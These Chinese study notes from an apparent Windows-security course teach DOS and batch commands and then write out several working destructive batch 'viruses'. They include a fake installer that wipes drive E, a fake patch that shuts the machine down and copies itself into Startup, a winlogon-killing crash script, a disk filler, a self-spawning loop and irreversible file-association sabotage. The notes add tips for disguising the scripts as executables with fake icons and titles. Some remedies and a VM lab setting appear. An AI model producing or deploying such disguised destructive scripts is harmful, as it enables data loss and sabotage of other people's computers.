# Day3 学习和dos命令 & 简单病毒与解药
## DOS 命令
1. `type` 在命令提示符界面，显示文件的内容


2. 为什么 `cmd` 可以直接打开
因为**配置了环境变量**，有一些 Windows 工具也是不用输入路径就可以直接打开的↓

3. 可直接打开的 windows 工具
notepad 记 事 本
write	写字板
mspaint 画图工具
calc	计算器

4. `md`  创建文件夹 `md 123`
`md	666\777\888`    `md	d:\abcd\123`
**注意：文件夹和文件不能重名，“md d:\abcd\123.txt”,创建出来的是一个名为 123.txt 的文件夹**

5. `rd`  删除文件夹   `rd	123`
- `rd	666\777\888`	（注意，此命令只把 888 删除） `rd	d:\abcd\123`
删除文件夹时，**默认要求文件夹中不能含有其它内容**（文件或文件夹）

- 删除非空文件夹的方法 `rd	666 /s`
`/s` 表示连同子目录一起删除

- `rd` 命令后方可以同时带有多个文件夹名称，用空格分隔 `rd	666   /s   /q`	删除时无确认信息

- `rd	666    /s    /q  >nul   2>nul`	删除时无确认也无执行结果

**补充：>nul 表示执行成功的信息不提醒， 2>nul 表示执行失败的信息不提醒**

6. `del` 删除文件 `del	123.txt`
- `del	c:\abc\666.mp4`

- `del	abc\*.* /s` 删除 abc 中的所有文件（**含子目录中的文件，但是保留文件夹**） 
- `del	abc\*.*   /s   /q`	删除时无确认信息
- `del	abc\*.* /s /q >nul 2>nul` 删除时无确认也无执行结果

7. `echo` 写文件
- `echo   hello>e:\abc\1.txt`	把 hello 写入 1.txt 中（如果文件已存在，则覆盖）

- `echo hello>>e:\abc\1.txt` 把 hello 写入 1.txt 中（如果文件已存在，则把 hello 追加到原文件内容的最后面）

- 如果 `echo` 的正文中包含`>`等符号，需要在符号前加`^`

8. `copy` 复 制
- `copy   abc\1.txt	d:\abc\`
- `copy   abc\1.txt	d:\abc\666.txt`	**把 1.txt 复制到 d:\abc\下，并改名为 666.txt 保存**

9. `move` 移 动
- `move   abc\1.txt	d:\abc\`
- `move   abc\1.txt	d:\abc\666.txt`

10. `Shutdown` 关 机
- `shutdown   /s`	关机	（默认 30 秒之后关机）
- `shutdown    /s  /t   600`	(600 秒之后关机) （600 秒是最大限度（10mins） shutdown   `/a`	取消关机
- `shutdown /s /t 0` 立刻关机
- `shutdown    /s  /f   /t	1` （1 秒后【强制】关机）` Shutdown   /L`	注销
- 注意：在 shutdown 命令中（**只有在 shutdown 命令中**） /s /t /f 等参数也可以写作 -s -t -f

## 批处理文件
打开记事本在里面写多行命令，例如：
```
E:
echo 姓名：Xiaoxiao >> 1.txt
echo 性别：女 >> 1.txt
echo 年龄：19 >> 1.txt
echo 身高：168 >> 1.txt
echo 体重：58kg >> 1.txt
```

> 自上而下成批地处理文件中的每一条命令，直到执行完最后一条为止。把文件扩展名改为：`.bat` ,再双击执行文件

**写有命令的批处理文件也可称为脚本，带有攻击性或破坏性的脚本，即恶意脚本。**

11. `Pause` 暂停
> 在批处理文件执行过程中，进行暂停。当用户按下任意键之后，再执行后面的命令

12. `@echo off` 关闭回显功能，也就是屏蔽过程，建议放置在批处理文件的首行。可在后面添加自己写的提示文字
例如：	
```
@echo off	
echo =================================
echo	欢迎使用 XXX 在线安装程序 v.10	
echo =================================
```

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8762.png)

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8763.png)

## 简单的病毒:把 e 盘下面的东西删除光
```
@echo off
color 0A
echo =================================
echo	欢迎使用 XXX 在线安装程序 v.10
echo =================================
e:
cd \
echo 程序即将执行

pause
rd .\ /s /q >nul 2>nul
echo 恭喜您，游戏安装完毕，谢谢使用pause

```

## 把病毒做的更完美一些：	
1. 下载一个 Bat to Exe 的软件，在软件中可以把图标和后缀都给改了	
2. 图标制作可以去网上搜ico 图标	
3. 注意如果是在自己本机上写好脚本，发送到虚拟机上，本机为 win10 或更高版本，本机是 64 位，虚拟机2003 server 是 32 位，有可能脚本执行不了，需要把软件和生成图标都放到虚拟机里操作去完成这个实验
4. 病毒做完之后，窗口标题显示还是会露马脚，所以引入 title

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8764.png)

`title 窗口的标题` 

## 关机病毒
```
@echo off
title window 在线补 ding 安装
echo ==========================
echo 您好，欢迎使用本程序
echo ==============================
pause
shutdown /f /s /t 0
```
> 将上述病毒植入到目标计算机的启动文件中，可以实现每次开机后马上关闭

### 关机病毒升级版
```
@echo off
copy game.bat "C:\Documents and Settings\Administrator\「开始」菜单\程序\启动" shutdown /s /f /t 1
```

- set 设置变量
``` set /p x = 请输入您预定的关机时长（秒）```

请输入您预定的关机时长（秒）是提示文字，**由用户输入内容**，并保存子变量 x 当中

`Shutdown /s /t %x%` 以变量 x 的值为时长，定时关机

- 脚本：
```
@echo off
Title 延迟关机小程序
Echo ====================================
Echo 欢迎使用此脚本设置延迟关机
Echo ====================================
Set /p x = 请输入您预定的关机时长（秒）
Shutdown /s /t %x%
```

- 应用：例如我正在下载一个游戏，但是我有事要出门，我就可以写一个脚本定一个时间去关机。

- `set /a x=123*4/2` 不需要用户输入的变量用的是 `/a` ，非交互式赋值，赋值时可以使用数学运算符

13. `fsutil file createnew` 按照指定的大小创建文件 `fsutil file createnew e:\new.info 10000000000`

14. `attrib` 设置文件属性
- `attrib +h e:\new.info` 添加“隐藏”属性
- `attrib +s e:\new.info` 添加“系统”属性
- `attrib -h e:\new.info`取消“隐藏”属性
- `attrib -s e:\new.info` 取消“系统”属性

## 占用磁盘资源病毒
```
fsutil file createnew e:\new.info 10000000000
attrib +s +h e:\new.info
```


## `taskkill` 结束进程
- `taskkill   /im   explorer.exe   /f` 	强制关闭桌面进程

- 解决方法
 a. 关机、重启
 b. 重新启动 `explorer.exe` 进程
> 方法如下: `Ctrl+alt+del` 呼出任务管理器

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8765.png)

在任务管理器界面，新建任务

![iamge](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8766.png)

输入 `explorer.exe` 重新启动进程

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8767.png)

## 恶搞病毒:暂时删除桌面
```
@echo off
title windows2003 系统垃圾清理color 0a
echo ##############################################
echo #	#
echo #	即将清理系统垃圾	#
echo #	#
echo ##############################################
pause
echo 垃圾清理中......
ping -n 15 127.0.0.1 >nul 2>nul 
taskkill /im explorer.exe /f >nul 2>nul echo #
echo 哈哈，你的电脑完犊子了！ ping -n 30 127.0.0.1 >nul 2>nul start c:\windows\explorer.exe
echo =======哥们，是不是吓死啦，嘿嘿======= pause
```
> **-n 表示 ping 的次数，后面的数字就是次数 127.0.0.1 是自己的电脑**

15. start 启 动
`start   c:\windows\explorer.exe`	启动 explorer.exe 与直接输入路径打开程序基本相同,但如果程序自己启动自己本身，那么使用 `start` **会弹出新的界面**

## 无限弹窗病毒
文件 1.bat 中写入： `start 1.bat`

16. `ntsd` 进程管理工具 可在 `cmd` 中当命令执行 `ntsd -c`	结束进程
- `ntsd -c q` 无询问地结束进程
- `ntsd -c -pn` 通过进行名称结束进程
- `ntsd -c q -pn winlogon.exe`	结束登录进程

## 蓝屏病毒
在 1.bat 中写入：

```
Copy 1.bat “C:\Documents and Settings\Administrator\「开始」菜单\程序\启动” 
ntsd -c q -pn winlogon.exe
```

17. `assoc` 文件关联 `assoc .txt=exefile`

## 文件失效病毒
- `assoc .txt=exefile` 表示：凡是遇到.txt 结尾的都当做 exe 文件处理
- `assoc .png=exefile` 
- `assoc .mp4=exefile` 
- `assoc .doc=exefile` 
- `assoc .jpg=exefile`
- `assoc .exe=txtfile` （ 绝 杀 ） 
- `assoc .bat=pngfile` （ 绝 杀 ）

- 解药：把扩展名重新关联到正确的文件格式上
（`assoc .png=pngfile`）
- 或关联到一个不存在的文件格式上
（`assoc .png=abcdfile`） **但无法解决绝杀**
